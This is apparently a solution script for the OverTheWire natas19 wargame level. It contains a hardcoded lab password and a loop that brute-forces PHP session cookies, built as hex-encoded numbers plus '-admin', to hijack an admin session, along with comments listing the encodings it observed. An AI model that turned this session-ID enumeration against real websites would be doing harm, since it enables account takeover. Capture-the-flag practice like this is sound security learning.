import requests
from requests.auth import HTTPBasicAuth


target = 'http://natas19.natas.labs.overthewire.org'

# r = requests.get(target)
# assert(r.status_code == requests.codes.ok)

def convertToAscii(n):
	out = ""
	for c in str(n):
		# print(str(hex(ord(c))))
		out += str(hex(ord(c)))[2:]
	return out + str("2d61646d696e")

print(convertToAscii(158))


Auth = HTTPBasicAuth("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
for i in range(1,641):
	c = convertToAscii(i)
	print(i, c)
	cookies = {"PHPSESSID": c}
	r = requests.get(target, auth=Auth, cookies=cookies, data={'username':'admin', 'password':'lol'})
	if "next level" in r.text:
		print(r.text)
		print("found! SESSID={}".format(i))
		break


# 3131322d61736466
# 3131322d61736466
# 3232352d7761736164
# 3336.  2d70617373 pass
# 313933 2d70617373 pass1
# 343739 2d70617373
# 323939 2d70617373 pass2
# 323434 2d70617373
# 353339 2d70617373 pass pass
# 353930 2d70617373 admin pass
# 353539 2d70617373
# 313539 2d70617373
# 353039 2d70617373

# 38372d61646d696e   admin pass
# 3135382d61646d696e
# 3536332d61646d696e
# 3533332d61646d696e
# 3231382d61646d696e admin pass0
